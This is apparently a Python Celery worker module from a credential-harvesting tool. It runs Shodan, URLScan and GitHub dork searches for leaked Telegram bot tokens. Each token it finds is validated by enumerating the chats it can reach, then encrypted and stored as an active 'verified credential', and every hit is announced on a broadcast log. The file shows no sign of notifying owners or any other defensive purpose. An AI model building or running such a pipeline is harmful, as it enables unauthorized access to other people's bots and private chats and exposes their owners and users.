from app.workers.celery_app import app
import asyncio # Ensure asyncio is imported
from app.services.broadcaster_srv import broadcaster_service
from app.services.scanners import ShodanService, GithubService, UrlScanService
from app.core.security import security
from app.core.database import db
import hashlib

# Instantiate services (Fofa/Censys/HybridAnalysis REMOVED - API issues)
shodan = ShodanService()
github = GithubService()
urlscan = UrlScanService()

def _calculate_hash(token: str) -> str:
    return hashlib.sha256(token.encode()).hexdigest()

async def _save_credentials_async(results, source_name: str):
    """
    Async helper to save credentials with STRICT validation:
    - Token must be valid
    - Chat ID must be discoverable
    Only saves if BOTH conditions are met.
    """
    from app.services.scraper_srv import scraper_service
    
    saved_count = 0
    for item in results:
        token = item.get("token")
        if not token or token == "MANUAL_REVIEW_REQUIRED":
            continue
        
        token_hash = _calculate_hash(token)
        
        try:
            # Step 1: Check if already exists
            existing = db.table("discovered_credentials").select("id").eq("token_hash", token_hash).execute()
            if existing.data:
                continue  # Skip duplicate
            
            # Step 2: Validate token by discovering chats
            print(f"    [Validate] Testing token {token[:15]}... for chats")
            chats = await scraper_service.discover_chats(token)
            
            if not chats:
                print(f"    [Validate] ❌ No chats found for token, skipping save.")
                await broadcaster_service.send_log(f"⚠️ [{source_name}] Token found but no chats - not saved.")
                continue
            
            # Step 3: Token valid AND has chats - save with first chat_id
            first_chat = chats[0]
            encrypted_token = security.encrypt(token)
            
            data = {
                "bot_token": encrypted_token,
                "token_hash": token_hash,
                "chat_id": first_chat.get("id"),
                "source": source_name,
                "status": "active",  # Already validated!
                "meta": {
                    **item.get("meta", {}),
                    "chat_name": first_chat.get("name"),
                    "chat_type": first_chat.get("type"),
                    "total_chats": len(chats)
                }
            }
            
            res = db.table("discovered_credentials").insert(data).execute()
            
            if res.data:
                new_id = res.data[0]['id']
                await broadcaster_service.send_log(
                    f"🎯 [{source_name}] **Verified Credential!**\n"
                    f"ID: `{new_id}`\n"
                    f"Chat: {first_chat.get('name')} ({first_chat.get('type')})"
                )
                saved_count += 1
                
        except Exception as e:
            print(f"    [Validate] Error: {e}")
            pass
    return saved_count

def _save_credentials(results, source_name: str):
    """Sync wrapper for async save logic"""
    loop = asyncio.get_event_loop()
    if loop.is_closed():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    return loop.run_until_complete(_save_credentials_async(results, source_name))

def _send_log_sync(message: str):
    """Sync wrapper to send logs via broadcaster."""
    loop = asyncio.get_event_loop()
    if loop.is_closed():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    loop.run_until_complete(broadcaster_service.send_log(message))

@app.task(name="scanner.scan_shodan")
def scan_shodan(query: str = None):
    import time
    default_queries = [
        "http.html:\"api.telegram.org\"",
        "http.html:\"bot_token\"", 
        "http.title:\"Telegram Bot\"",
        "http.title:\"Telegram Login\""
    ]
    
    queries = [query] if query else default_queries
    total_saved = 0
    errors = []

    print(f"Starting Shodan scan with {len(queries)} queries...")
    _send_log_sync(f"🌎 [Shodan] Starting scan with {len(queries)} queries...")

    for q in queries:
        try:
            results = shodan.search(q)
            saved = _save_credentials(results, "shodan")
            total_saved += saved
            time.sleep(1) # Rate limit respect
        except Exception as e:
            errors.append(str(e))
            
    result_msg = f"Shodan scan finished. Saved {total_saved} new credentials."
    if errors:
        result_msg += f" (Errors: {len(errors)})"
        _send_log_sync(f"❌ [Shodan] Completed with errors: {errors[0]}...")

    _send_log_sync(f"🏁 [Shodan] Finished. Saved {total_saved} new credentials.")
    return result_msg

@app.task(name="scanner.scan_urlscan")
def scan_urlscan(query: str = "api.telegram.org"):
    print(f"Starting URLScan scan: {query}")
    _send_log_sync(f"🔍 [URLScan] Starting scan with query: `{query}`")
    try:
        results = urlscan.search(query)
        saved = _save_credentials(results, "urlscan")
        msg = f"URLScan scan finished. Saved {saved} new credentials."
        _send_log_sync(f"🏁 [URLScan] Finished. Saved {saved} new credentials.")
        return msg
    except Exception as e:
        _send_log_sync(f"❌ [URLScan] Scan failed: {e}")
        return f"URLScan scan failed: {e}"

@app.task(name="scanner.scan_github")
def scan_github(query: str = None):
    import time
    default_dorks = [
        "filename:.env api.telegram.org",
        "path:config api.telegram.org",
        "\"TELEGRAM_BOT_TOKEN\"",
        "language:python \"ApplicationBuilder\" \"token\"",
        "language:python \"Telethon\" \"api_id\"",
        "filename:config.json \"bot_token\"",
        "filename:settings.py \"TELEGRAM_TOKEN\"",
        "\"api.telegram.org\""  # Catch-all for any file containing the API URL
    ]
    
    queries = [query] if query else default_dorks
    total_saved = 0
    errors = []

    print(f"Starting GitHub scan with {len(queries)} queries...")
    _send_log_sync(f"🐱 [GitHub] Starting scan with {len(queries)} dorks...")

    for q in queries:
        print(f"Executing GitHub Dork: {q}")
        try:
            results = github.search(q)
            saved = _save_credentials(results, "github")
            total_saved += saved
            print(f"  > Found {len(results)} matches, saved {saved} new.")
        except Exception as e:
            print(f"  > Error: {e}")
            errors.append(str(e))
        
            time.sleep(5) 

    result_msg = f"GitHub scan finished. Saved {total_saved} unique credentials."
    if errors:
        result_msg += f" (Encountered {len(errors)} errors)"
    _send_log_sync(f"🏁 [GitHub] Finished. Saved {total_saved} unique credentials.")
    return result_msg

# scan_censys REMOVED - Censys API access issues
# scan_hybrid REMOVED - Hybrid Analysis API access issues
